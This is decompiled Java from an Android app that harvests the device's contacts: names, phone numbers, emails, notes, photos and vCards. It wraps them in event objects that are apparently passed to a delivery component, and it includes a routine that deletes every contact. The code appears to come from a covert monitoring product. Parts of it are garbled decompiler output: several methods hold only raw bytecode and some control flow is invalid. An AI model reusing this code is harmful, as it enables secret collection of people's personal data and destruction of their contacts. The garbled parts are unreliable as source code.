package com.vvt.addressbookmanager.b.b;

import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract.Contacts;
import android.provider.ContactsContract.Data;
import android.provider.ContactsContract.RawContacts;
import com.vvt.addressbookmanager.d;
import com.vvt.events.FxAddressBookEvent;
import java.util.ArrayList;
import java.util.Iterator;

public class c
{
  private static final boolean a = d.a;
  private static final boolean b = d.e;
  
  /* Error */
  private static long a(long paramLong, Context paramContext)
  {
    // Byte code:
    //   0: iconst_1
    //   1: istore_3
    //   2: iconst_m1
    //   3: i2l
    //   4: lstore 4
    //   6: aload_2
    //   7: invokevirtual 24	android/content/Context:getContentResolver	()Landroid/content/ContentResolver;
    //   10: astore 6
    //   12: getstatic 30	android/provider/ContactsContract$RawContacts:CONTENT_URI	Landroid/net/Uri;
    //   15: astore 7
    //   17: iload_3
    //   18: anewarray 32	java/lang/String
    //   21: astore 8
    //   23: aload 8
    //   25: iconst_0
    //   26: ldc 34
    //   28: aastore
    //   29: ldc 36
    //   31: astore 9
    //   33: iload_3
    //   34: anewarray 32	java/lang/String
    //   37: astore 10
    //   39: lload_0
    //   40: invokestatic 40	java/lang/String:valueOf	(J)Ljava/lang/String;
    //   43: astore 11
    //   45: aload 10
    //   47: iconst_0
    //   48: aload 11
    //   50: aastore
    //   51: aconst_null
    //   52: astore 11
    //   54: aload 6
    //   56: aload 7
    //   58: aload 8
    //   60: aload 9
    //   62: aload 10
    //   64: aconst_null
    //   65: invokevirtual 46	android/content/ContentResolver:query	(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   68: astore 8
    //   70: lload 4
    //   72: lstore 12
    //   74: aload 8
    //   76: invokeinterface 52 1 0
    //   81: istore 14
    //   83: iload 14
    //   85: ifeq +34 -> 119
    //   88: iconst_0
    //   89: istore 14
    //   91: aconst_null
    //   92: astore 9
    //   94: aload 8
    //   96: iconst_0
    //   97: invokeinterface 56 2 0
    //   102: lstore 12
    //   104: goto -30 -> 74
    //   107: astore 9
    //   109: getstatic 17	com/vvt/addressbookmanager/removeFromPath/removeFromPath/MyUncaughtExceptionHandler:removeFromPath	Z
    //   112: istore 14
    //   114: iload 14
    //   116: ifeq +3 -> 119
    //   119: aload 8
    //   121: invokeinterface 60 1 0
    //   126: lload 12
    //   128: lreturn
    //   129: astore 6
    //   131: aload 8
    //   133: invokeinterface 60 1 0
    //   138: aload 6
    //   140: athrow
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	141	0	paramLong	long
    //   0	141	2	paramContext	Context
    //   1	33	3	i	int
    //   4	67	4	l1	long
    //   10	45	6	localContentResolver	ContentResolver
    //   129	10	6	localObject1	Object
    //   15	42	7	localUri	Uri
    //   21	111	8	localObject2	Object
    //   31	62	9	str1	String
    //   107	1	9	localException	Exception
    //   37	26	10	arrayOfString	String[]
    //   43	10	11	str2	String
    //   72	55	12	l2	long
    //   81	34	14	bool	boolean
    // Exception table:
    //   from	to	target	type
    //   74	81	107	java/lang/Exception
    //   96	102	107	java/lang/Exception
    //   74	81	129	finally
    //   96	102	129	finally
    //   109	112	129	finally
  }
  
  public static FxAddressBookEvent a(long paramLong, Context paramContext, boolean paramBoolean)
  {
    int i = 2;
    byte[] arrayOfByte = null;
    int j = 1;
    boolean bool1 = a;
    if (bool1) {}
    FxAddressBookEvent localFxAddressBookEvent = new com/vvt/events/FxAddressBookEvent;
    localFxAddressBookEvent.<init>();
    localFxAddressBookEvent.setEventId(paramLong);
    localFxAddressBookEvent.setClientId(paramLong);
    Object localObject1 = paramContext.getContentResolver();
    Object localObject4 = ContactsContract.Data.CONTENT_URI;
    Object localObject5 = a.b;
    String str2 = a.d;
    String[] arrayOfString = new String[j];
    Object localObject6 = String.valueOf(paramLong);
    arrayOfString[0] = localObject6;
    localObject4 = ((ContentResolver)localObject1).query((Uri)localObject4, (String[])localObject5, str2, arrayOfString, null);
    if (localObject4 != null) {}
    for (;;)
    {
      int n;
      try
      {
        bool1 = ((Cursor)localObject4).moveToFirst();
        if (!bool1) {
          break label1111;
        }
        localObject1 = "lookup";
        int k = ((Cursor)localObject4).getColumnIndex((String)localObject1);
        localObject1 = ((Cursor)localObject4).getString(k);
        localObject5 = "data2";
        n = ((Cursor)localObject4).getColumnIndex((String)localObject5);
        localObject5 = ((Cursor)localObject4).getString(n);
        str2 = "data3";
        int i1 = ((Cursor)localObject4).getColumnIndex(str2);
        str2 = ((Cursor)localObject4).getString(i1);
        localObject5 = com.vvt.ag.b.b((String)localObject5);
        localFxAddressBookEvent.setFirstName((String)localObject5);
        localObject5 = com.vvt.ag.b.b(str2);
        localFxAddressBookEvent.setLastName((String)localObject5);
        localObject6 = localObject1;
        if (localObject4 != null) {
          ((Cursor)localObject4).close();
        }
        localObject1 = paramContext.getContentResolver();
        localObject4 = ContactsContract.Data.CONTENT_URI;
        localObject5 = new String[i];
        localObject5[0] = "data1";
        localObject5[j] = "data2";
        str2 = a.e;
        arrayOfString = new String[j];
        str3 = String.valueOf(paramLong);
        arrayOfString[0] = str3;
        localObject4 = ((ContentResolver)localObject1).query((Uri)localObject4, (String[])localObject5, str2, arrayOfString, null);
        if (localObject4 == null) {
          break label534;
        }
        try
        {
          boolean bool2 = ((Cursor)localObject4).moveToFirst();
          if (!bool2) {
            break label534;
          }
          bool2 = ((Cursor)localObject4).isAfterLast();
          if (bool2) {
            break label534;
          }
          localObject1 = "data1";
          int m = ((Cursor)localObject4).getColumnIndex((String)localObject1);
          localObject1 = ((Cursor)localObject4).getString(m);
          localObject5 = "data2";
          n = ((Cursor)localObject4).getColumnIndex((String)localObject5);
          n = ((Cursor)localObject4).getInt(n);
          switch (n)
          {
          default: 
            localObject1 = com.vvt.ag.b.b((String)localObject1);
            localFxAddressBookEvent.addOtherNumber((String)localObject1);
            ((Cursor)localObject4).moveToNext();
            continue;
            str1 = finally;
          }
        }
        finally {}
        localObject3 = com.vvt.ag.b.b(str1);
      }
      finally
      {
        if (localObject4 != null) {
          ((Cursor)localObject4).close();
        }
      }
      localFxAddressBookEvent.addHomePhone((String)localObject3);
      continue;
      Object localObject3 = com.vvt.ag.b.b((String)localObject3);
      localFxAddressBookEvent.addMobilePhone((String)localObject3);
      continue;
      localObject3 = com.vvt.ag.b.b((String)localObject3);
      localFxAddressBookEvent.addWorkPhone((String)localObject3);
      continue;
      label534:
      if (localObject4 != null) {
        ((Cursor)localObject4).close();
      }
      localObject3 = paramContext.getContentResolver();
      localObject4 = ContactsContract.Data.CONTENT_URI;
      localObject5 = new String[i];
      localObject5[0] = "data1";
      localObject5[j] = "data2";
      str2 = a.f;
      arrayOfString = new String[j];
      String str3 = String.valueOf(paramLong);
      arrayOfString[0] = str3;
      localObject3 = ((ContentResolver)localObject3).query((Uri)localObject4, (String[])localObject5, str2, arrayOfString, null);
      if (localObject3 != null)
      {
        boolean bool4 = ((Cursor)localObject3).moveToFirst();
        if (bool4)
        {
          bool4 = ((Cursor)localObject3).isAfterLast();
          if (!bool4)
          {
            int i2 = ((Cursor)localObject3).getColumnIndex("data1");
            localObject4 = ((Cursor)localObject3).getString(i2);
            localObject5 = "data2";
            n = ((Cursor)localObject3).getColumnIndex((String)localObject5);
            n = ((Cursor)localObject3).getInt(n);
            switch (n)
            {
            }
            for (;;)
            {
              ((Cursor)localObject3).moveToNext();
              break;
              localObject4 = com.vvt.ag.b.b((String)localObject4);
              localFxAddressBookEvent.setHomeEMail((String)localObject4);
              continue;
              localObject4 = com.vvt.ag.b.b((String)localObject4);
              localFxAddressBookEvent.setWorkEMail((String)localObject4);
              continue;
              localObject4 = com.vvt.ag.b.b((String)localObject4);
              localFxAddressBookEvent.setOtherEMail((String)localObject4);
            }
          }
        }
      }
      if (localObject3 != null) {
        ((Cursor)localObject3).close();
      }
      localObject3 = paramContext.getContentResolver();
      localObject4 = ContactsContract.Data.CONTENT_URI;
      localObject5 = new String[j];
      localObject5[0] = "data1";
      str2 = a.g;
      arrayOfString = new String[j];
      str3 = String.valueOf(paramLong);
      arrayOfString[0] = str3;
      localObject3 = ((ContentResolver)localObject3).query((Uri)localObject4, (String[])localObject5, str2, arrayOfString, null);
      if (localObject3 != null)
      {
        boolean bool5 = ((Cursor)localObject3).moveToFirst();
        if (bool5)
        {
          int i3 = ((Cursor)localObject3).getColumnIndex("data1");
          localObject4 = ((Cursor)localObject3).getString(i3);
          localFxAddressBookEvent.setNote((String)localObject4);
        }
      }
      if (localObject3 != null) {
        ((Cursor)localObject3).close();
      }
      localObject3 = paramContext.getContentResolver();
      localObject4 = ContactsContract.Data.CONTENT_URI;
      localObject5 = new String[j];
      localObject5[0] = "data15";
      str2 = a.h;
      arrayOfString = new String[j];
      str3 = String.valueOf(paramLong);
      arrayOfString[0] = str3;
      localObject3 = ((ContentResolver)localObject3).query((Uri)localObject4, (String[])localObject5, str2, arrayOfString, null);
      if (localObject3 != null)
      {
        boolean bool6 = ((Cursor)localObject3).moveToFirst();
        if (bool6)
        {
          int i4 = ((Cursor)localObject3).getColumnIndex("data15");
          localObject4 = ((Cursor)localObject3).getBlob(i4);
          localFxAddressBookEvent.setContactPicture((byte[])localObject4);
          ((Cursor)localObject3).close();
        }
      }
      if (localObject3 != null) {
        ((Cursor)localObject3).close();
      }
      if (paramBoolean)
      {
        arrayOfByte = a((String)localObject6, paramContext);
        if (arrayOfByte == null) {
          arrayOfByte = com.vvt.addressbookmanager.delivery.b.b(localFxAddressBookEvent);
        }
      }
      localFxAddressBookEvent.setVCardData(arrayOfByte);
      boolean bool3 = a;
      if (bool3) {}
      bool3 = a;
      if (bool3) {}
      return localFxAddressBookEvent;
      label1111:
      localObject6 = null;
    }
  }
  
  public static ArrayList a(Context paramContext)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList1 = new java/util/ArrayList;
    localArrayList1.<init>();
    if (paramContext == null)
    {
      localObject1 = localArrayList1;
      return (ArrayList)localObject1;
    }
    Object localObject3 = ContactsContract.Contacts.CONTENT_URI;
    String[] arrayOfString = new String[2];
    Object localObject1 = null;
    arrayOfString[0] = "_id";
    String str1 = "display_name";
    arrayOfString[1] = str1;
    bool1 = com.vvt.aa.a.a();
    label65:
    boolean bool3;
    Long localLong;
    if (bool1)
    {
      str1 = "in_default_directory = '1'";
      bool3 = false;
      localLong = null;
      localObject1 = paramContext.getContentResolver();
      String str2 = "display_name COLLATE LOCALIZED ASC";
      localObject3 = ((ContentResolver)localObject1).query((Uri)localObject3, arrayOfString, str1, null, str2);
    }
    for (;;)
    {
      try
      {
        bool1 = ((Cursor)localObject3).moveToNext();
        if (bool1)
        {
          localObject1 = "_id";
          int i = ((Cursor)localObject3).getColumnIndex((String)localObject1);
          long l = ((Cursor)localObject3).getLong(i);
          localObject1 = "display_name";
          i = ((Cursor)localObject3).getColumnIndex((String)localObject1);
          localObject1 = ((Cursor)localObject3).getString(i);
          bool3 = a;
          if (bool3) {}
          localLong = Long.valueOf(l);
          bool3 = localArrayList1.contains(localLong);
          if (bool3) {
            continue;
          }
          bool3 = a(paramContext, l);
          if (bool3)
          {
            bool2 = a;
            if (!bool2) {
              continue;
            }
            continue;
            str1 = "in_visible_group = '1'";
            break label65;
          }
          bool3 = b(l, paramContext);
          if (bool3)
          {
            bool2 = a;
            if (!bool2) {
              continue;
            }
            continue;
          }
          bool2 = com.vvt.ag.b.a((String)localObject1);
          if (!bool2)
          {
            localObject1 = Long.valueOf(l);
            bool2 = localArrayList1.contains(localObject1);
            if (bool2) {
              continue;
            }
            localObject1 = Long.valueOf(l);
            localArrayList1.add(localObject1);
            continue;
          }
        }
      }
      catch (Exception localException)
      {
        boolean bool2 = b;
        if ((!bool2) || (localObject3 != null)) {
          ((Cursor)localObject3).close();
        }
        bool2 = a;
        if (bool2) {}
        ArrayList localArrayList2 = localArrayList1;
        break;
        bool2 = a;
        if (!bool2) {
          continue;
        }
        continue;
      }
      finally
      {
        if (localObject3 != null) {
          ((Cursor)localObject3).close();
        }
      }
      if (localObject3 == null) {}
    }
  }
  
  public static ArrayList a(Context paramContext, boolean paramBoolean)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    if (paramContext == null) {}
    for (Object localObject = localArrayList;; localObject = localArrayList)
    {
      return (ArrayList)localObject;
      localObject = a(paramContext);
      Iterator localIterator = ((ArrayList)localObject).iterator();
      for (;;)
      {
        bool1 = localIterator.hasNext();
        if (!bool1) {
          break;
        }
        long l = ((Long)localIterator.next()).longValue();
        localObject = a(l, paramContext, paramBoolean);
        boolean bool2 = ((FxAddressBookEvent)localObject).isValidContact();
        if (bool2)
        {
          bool2 = a;
          if (bool2) {}
          localArrayList.add(localObject);
        }
        else
        {
          bool1 = a;
          if (!bool1) {}
        }
      }
      bool1 = a;
      if (!bool1) {}
    }
  }
  
  private static boolean a(Context paramContext, long paramLong)
  {
    int i = 1;
    long l = a(paramLong, paramContext);
    Object localObject = Uri.withAppendedPath(ContentUris.withAppendedId(ContactsContract.RawContacts.CONTENT_URI, l), "entity");
    String str = "data1= 'myselfcontact'";
    ContentResolver localContentResolver = paramContext.getContentResolver();
    String[] arrayOfString = new String[i];
    arrayOfString[0] = "data1";
    localObject = localContentResolver.query((Uri)localObject, arrayOfString, str, null, null);
    int j;
    if (localObject != null)
    {
      j = ((Cursor)localObject).getCount();
      if (j > 0)
      {
        j = i;
        ((Cursor)localObject).close();
      }
    }
    for (;;)
    {
      return j;
      int k = 0;
      localContentResolver = null;
      break;
      k = 0;
      localContentResolver = null;
    }
  }
  
  /* Error */
  public static byte[] a(String paramString, Context paramContext)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: getstatic 272	android/provider/ContactsContract$Contacts:CONTENT_VCARD_URI	Landroid/net/Uri;
    //   5: astore_3
    //   6: aload_3
    //   7: aload_0
    //   8: invokestatic 263	android/net/Uri:withAppendedPath	(Landroid/net/Uri;Ljava/lang/String;)Landroid/net/Uri;
    //   11: astore_3
    //   12: aload_1
    //   13: invokevirtual 24	android/content/Context:getContentResolver	()Landroid/content/ContentResolver;
    //   16: astore 4
    //   18: ldc_w 274
    //   21: astore 5
    //   23: aload 4
    //   25: aload_3
    //   26: aload 5
    //   28: invokevirtual 278	android/content/ContentResolver:openAssetFileDescriptor	(Landroid/net/Uri;Ljava/lang/String;)Landroid/content/res/AssetFileDescriptor;
    //   31: astore 4
    //   33: aload 4
    //   35: ifnull +78 -> 113
    //   38: aload 4
    //   40: invokevirtual 283	android/content/res/AssetFileDescriptor:getDeclaredLength	()J
    //   43: lstore 6
    //   45: lload 6
    //   47: l2i
    //   48: istore 8
    //   50: iload 8
    //   52: newarray <illegal type>
    //   54: astore_3
    //   55: aload 4
    //   57: invokevirtual 287	android/content/res/AssetFileDescriptor:createInputStream	()Ljava/io/FileInputStream;
    //   60: astore_2
    //   61: aload_2
    //   62: aload_3
    //   63: invokevirtual 293	java/io/FileInputStream:read	([B)I
    //   66: pop
    //   67: aload_2
    //   68: invokestatic 298	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   71: aload_3
    //   72: areturn
    //   73: astore 9
    //   75: iconst_0
    //   76: istore 8
    //   78: aconst_null
    //   79: astore_3
    //   80: aload 9
    //   82: astore_2
    //   83: aload_3
    //   84: invokestatic 298	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   87: aload_2
    //   88: athrow
    //   89: astore 9
    //   91: aload_2
    //   92: astore_3
    //   93: aload 9
    //   95: astore_2
    //   96: goto -13 -> 83
    //   99: astore_3
    //   100: iconst_0
    //   101: istore 8
    //   103: aconst_null
    //   104: astore_3
    //   105: goto -38 -> 67
    //   108: astore 4
    //   110: goto -43 -> 67
    //   113: iconst_0
    //   114: istore 8
    //   116: aconst_null
    //   117: astore_3
    //   118: goto -51 -> 67
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	121	0	paramString	String
    //   0	121	1	paramContext	Context
    //   1	95	2	localObject1	Object
    //   5	88	3	localObject2	Object
    //   99	1	3	localIOException1	java.io.IOException
    //   104	14	3	localObject3	Object
    //   16	40	4	localObject4	Object
    //   108	1	4	localIOException2	java.io.IOException
    //   21	6	5	str	String
    //   43	3	6	l	long
    //   48	67	8	i	int
    //   73	8	9	localObject5	Object
    //   89	5	9	localObject6	Object
    // Exception table:
    //   from	to	target	type
    //   2	5	73	finally
    //   7	11	73	finally
    //   12	16	73	finally
    //   26	31	73	finally
    //   38	43	73	finally
    //   50	54	73	finally
    //   55	60	73	finally
    //   62	67	89	finally
    //   2	5	99	java/io/IOException
    //   7	11	99	java/io/IOException
    //   12	16	99	java/io/IOException
    //   26	31	99	java/io/IOException
    //   38	43	99	java/io/IOException
    //   50	54	99	java/io/IOException
    //   55	60	108	java/io/IOException
    //   62	67	108	java/io/IOException
  }
  
  public static void b(Context paramContext)
  {
    boolean bool1 = false;
    Object localObject1 = null;
    boolean bool3 = a;
    if (bool3) {}
    ContentResolver localContentResolver = paramContext.getContentResolver();
    Object localObject2 = ContactsContract.Contacts.CONTENT_URI;
    Uri localUri = null;
    localObject2 = localContentResolver.query((Uri)localObject2, null, null, null, null);
    for (;;)
    {
      bool1 = ((Cursor)localObject2).moveToNext();
      if (!bool1) {
        break;
      }
      localObject1 = "lookup";
      boolean bool2;
      try
      {
        int i = ((Cursor)localObject2).getColumnIndex((String)localObject1);
        localObject1 = ((Cursor)localObject2).getString(i);
        localUri = ContactsContract.Contacts.CONTENT_LOOKUP_URI;
        localObject1 = Uri.withAppendedPath(localUri, (String)localObject1);
        localUri = null;
        localContentResolver.delete((Uri)localObject1, null, null);
      }
      catch (Exception localException)
      {
        bool2 = b;
      }
      if (!bool2) {}
    }
    bool3 = a;
    if (bool3) {}
  }
  
  private static boolean b(long paramLong, Context paramContext)
  {
    i = 1;
    localObject1 = ContactsContract.Contacts.CONTENT_URI;
    localObject2 = new java/lang/StringBuilder;
    ((StringBuilder)localObject2).<init>();
    str1 = "_id=";
    localObject2 = ((StringBuilder)localObject2).append(str1).append(paramLong);
    String str2 = ((StringBuilder)localObject2).toString();
    try
    {
      localObject2 = paramContext.getContentResolver();
      j = 0;
      str1 = null;
      localObject1 = ((ContentResolver)localObject2).query((Uri)localObject1, null, str2, null, null);
      if (localObject1 == null) {
        break label216;
      }
      boolean bool1 = ((Cursor)localObject1).moveToFirst();
      if (!bool1) {
        break label216;
      }
      localObject2 = "is_user_profile";
      k = ((Cursor)localObject1).getColumnIndex((String)localObject2);
      j = -1;
      if (k != j) {
        break label175;
      }
      k = 0;
      localObject2 = null;
    }
    catch (Exception localException2)
    {
      for (;;)
      {
        int m;
        Object localObject3;
        try
        {
          int j = ((Cursor)localObject1).getColumnIndex(str1);
          int k = ((Cursor)localObject1).getInt(j);
          if (k == i)
          {
            k = i;
            if (localObject1 != null) {
              ((Cursor)localObject1).close();
            }
            return k;
            k = i;
            continue;
          }
          m = 0;
          localObject2 = null;
          continue;
          localException2 = localException2;
          m = 0;
          localObject3 = null;
        }
        catch (Exception localException1)
        {
          boolean bool2;
          continue;
        }
        bool2 = b;
        if (bool2)
        {
          continue;
          m = 0;
          localObject3 = null;
        }
      }
    }
    if (k != 0) {
      str1 = "is_user_profile";
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/addressbookmanager/removeFromPath/removeFromPath/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */